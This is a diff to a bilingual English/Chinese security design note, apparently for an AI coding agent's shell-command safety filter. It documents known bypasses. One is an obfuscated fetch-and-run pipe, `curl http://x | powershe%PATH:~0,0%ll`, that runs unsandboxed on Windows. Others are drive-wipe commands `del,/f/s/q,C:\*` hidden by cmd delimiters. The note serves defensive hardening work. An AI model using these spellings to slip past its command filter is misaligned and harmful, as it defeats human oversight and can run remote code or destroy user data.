@@ -134,7 +134,10 @@ review to rediscover:
   to the program word, the launcher idiom `%PYTHON% script.py`. Residual: a
   pair split across words is not read as one, and `cmd` leaves an *undefined*
   `%X%` literal, so that spelling is inert until something has defined the
-  variable.
+  variable. The consumer side of a pipe is the same residual —
+  `curl http://x | powershe%PATH:~0,0%ll` runs under `yolo` on Windows because
+  there is no sandbox there — a consequence of the Windows entry above rather
+  than a separate hole.
 - cmd's word delimiters are a separate problem with a real answer: `,`, `;` and
   `=` make `del,/f/s/q,C:\*`, `del;/f/s/q;C:\*` and `del=/f/s/q C:\*` one
   opaque word here (`basename_lower` of the first is `*`) and a drive wipe to
@@ -275,7 +278,9 @@ Linux Landlock + seccomp)、工作区边界、CI bot 的触发门禁。凡是打
   **所有档位**拿走普通命令,因为这层楼模式无关且不可覆盖:先是 `echo %PATH%`、
   `dir %USERPROFILE%`,收窄到程序词之后是 `%PYTHON% script.py` 这种启动器写法。
   残余:跨词的一对不会被读成一对;而 `cmd` 对**未定义**的 `%X%` 原样保留,所以那种
-  拼法在有人先把变量定义出来之前是惰性的。
+  拼法在有人先把变量定义出来之前是惰性的。管道的消费侧同理——
+  `curl http://x | powershe%PATH:~0,0%ll` 这类行 Windows 的 `yolo` 会跑,因为那里
+  没有沙箱;这是上面那条「Windows 没有约束」的残余,不是另一个洞。
 - cmd 的词分隔符是另一个问题,而它有确切的答案:`,`、`;`、`=` 让
   `del,/f/s/q,C:\*`、`del;/f/s/q;C:\*`、`del=/f/s/q C:\*` 在这里都是读不懂的词
   (第一个的 basename 是 `*`),对 `cmd` 却都是一次清盘。这层楼判**每一种读法**:
